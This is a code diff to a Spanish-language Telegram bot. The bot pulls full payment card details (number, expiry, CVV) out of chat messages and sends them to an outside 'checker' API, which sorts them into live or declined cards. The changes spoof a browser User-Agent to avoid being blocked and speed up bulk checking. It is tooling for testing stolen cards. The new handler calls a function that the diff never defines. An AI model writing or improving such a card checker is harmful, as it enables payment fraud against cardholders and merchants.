@@ -248,18 +248,25 @@ def api_checker(card_data):
     url = "https://ke1.be/en/checker2/api.php"
     payload = {"data": card_data}
     try:
-        r = requests.post(url, data=payload, timeout=10)
-        # Basado en tu lógica original de índices
-        if r.text[9] == '2':
-            return "LIVE", r.text[59:87]
-        elif r.text[9] == '1':
-            return "RECHAZADO", r.text[60:88]
-        elif r.text[9] == '3':
-            return "DESCONOCIDO", r.text[63:91]
+        # Añadimos un User-Agent para que el servidor no nos bloquee pensando que somos un bot simple
+        headers = {'User-Agent': 'Mozilla/5.0'}
+        r = requests.post(url, data=payload, timeout=15, headers=headers)
+        
+        # En lugar de r.text[9], buscamos contenido
+        respuesta = r.text.upper()
+        
+        if "LIVE" in respuesta or "APPROVED" in respuesta:
+            return "LIVE", "Tarjeta Aceptada"
+        elif "DEAD" in respuesta or "DECLINED" in respuesta or "REJECTED" in respuesta:
+            return "RECHAZADO", "Tarjeta Declinada"
+        elif "UNKNOWN" in respuesta:
+            return "DESCONOCIDO", "Estado no verificado"
         else:
-            return "ERROR", "Respuesta inesperada"
+            # Si el servidor responde algo raro, lo capturamos aquí
+            return "ERROR", f"Respuesta extraña del servidor: {r.text[:20]}..."
+            
     except Exception as e:
-        return "ERROR", str(e)
+        return "ERROR", f"Fallo de conexión: {str(e)}"
 
 # --- VARIABLES DE ESTADO ---
 user_settings = {}
@@ -269,83 +276,35 @@ user_history = {}
 
 # --- LÓGICA DEL CHECKER (CORREGIDA) ---
 
-async def procesar_checker(update: Update, lista_tarjetas: list):
-    """Envía las tarjetas a la API y compila resultados en mensajes separados"""
-    if not lista_tarjetas:
-        return
-
-    url = "https://ke1.be/en/checker2/api.php"
-    lives = []
-    rechazadas = []
-    desconocidos = []
-
-    msg_status = await update.message.reply_text(f"🔍 Revisando {len(lista_tarjetas)} tarjetas...")
-
-    for card in lista_tarjetas:
-        try:
-            # Limpieza profunda de la tarjeta (quitar espacios, acentos, saltos de línea)
-            card_clean = re.sub(r'\s+', '', card).replace("`", "").strip()
-            
-            # Petición a la API
-            payload = {"data": card_clean}
-            r = requests.post(url, data=payload, timeout=15)
-            
-            # Verificamos que la respuesta tenga el tamaño suficiente para ser procesada
-            if r.status_code == 200 and len(r.text) > 10:
-                status_char = r.text[9]
-                
-                if status_char == '2':
-                    # Lógica para Live
-                    lives.append(f"✅ `{card_clean}` -> {r.text[59:87].strip()}")
-                elif status_char == '1':
-                    # Lógica para Rechazado
-                    rechazadas.append(f"❌ `{card_clean}` -> {r.text[60:88].strip()}")
-                elif status_char == '3':
-                    # Lógica para Desconocido
-                    desconocidos.append(f"❓ `{card_clean}` -> {r.text[63:91].strip()}")
-                else:
-                    desconocidos.append(f"⚠️ `{card_clean}` -> Respuesta inesperada")
-            else:
-                desconocidos.append(f"⚠️ `{card_clean}` -> API sin respuesta válida")
-                
-        except Exception as e:
-            logging.error(f"Error revisando tarjeta {card}: {e}")
-            desconocidos.append(f"⚠️ `{card}` -> Error de conexión")
-
-    # Enviar resultados compilados (Solo si hay elementos en las listas)
-    if lives:
-        await update.message.reply_text("🟢 **LIVE**\n\n" + "\n".join(lives), parse_mode='Markdown')
-    if desconocidos:
-        await update.message.reply_text("🟡 **DESCONOCIDO / ERROR**\n\n" + "\n".join(desconocidos), parse_mode='Markdown')
-    if rechazadas:
-        # Agrupamos rechazadas para no saturar si son muchas
-        texto_rechazadas = "\n".join(rechazadas)
-        if len(texto_rechazadas) > 4000:
-            await update.message.reply_text(f"🔴 **RECHAZADAS**: {len(rechazadas)} tarjetas.")
-        else:
-            await update.message.reply_text("🔴 **RECHAZADO**\n\n" + texto_rechazadas, parse_mode='Markdown')
-    
-    try:
-        await msg_status.delete()
-    except:
-        pass
-
-# --- HANDLER CORREGIDO ---
-
 async def chk_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Extrae tarjetas de un texto masivo y las procesa"""
-    texto = update.message.text
-    if not texto:
-        return
-        
-    # Regex mejorada para capturar tarjetas incluso si están pegadas o en bloques
-    tarjetas_encontradas = re.findall(r'\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}', texto)
+    raw_input = update.message.text.replace('.chk', '').strip()
     
-    if not tarjetas_encontradas:
-        await update.message.reply_text("❌ Formato no detectado. Usa: `num|mes|año|cvv`")
+    if not raw_input:
+        await update.message.reply_text("❌ Formato: `.chk tarjeta|mes|año|cvv` ")
         return
+
+    # Regex más flexible
+    import re
+    found = re.findall(r'\d{15,16}\s*\|\s*\d{1,2}\s*\|\s*\d{2,4}\s*\|\s*\d{3,4}', raw_input)
+    
+    if not found:
+        await update.message.reply_text("❌ No se detectó el formato correcto.")
+        return
+
+    msg_espera = await update.message.reply_text(f"🔍 Procesando {len(found)} tarjetas...")
+
+    # Usar sesión para mejorar velocidad y estabilidad
+    with requests.Session() as session:
+        session.headers.update({'User-Agent': 'Mozilla/5.0'})
         
-    await procesar_checker(update, tarjetas_encontradas)
+        resultados = []
+        for card in found:
+            status, info = api_checker_mejorado(card, session) # Pasar la sesión
+            icono = "✅" if status == "LIVE" else "❌" if status == "RECHAZADO" else "⚠️"
+            resultados.append(f"{icono} `{card}` -> {info}")
+
+    await update.message.reply_text("\n".join(resultados), parse_mode='Markdown')
+    await msg_espera.delete()
     
 async def ejecutar_generacion(update: Update, context: ContextTypes.DEFAULT_TYPE, raw_data: str):
     user_id = update.effective_user.id
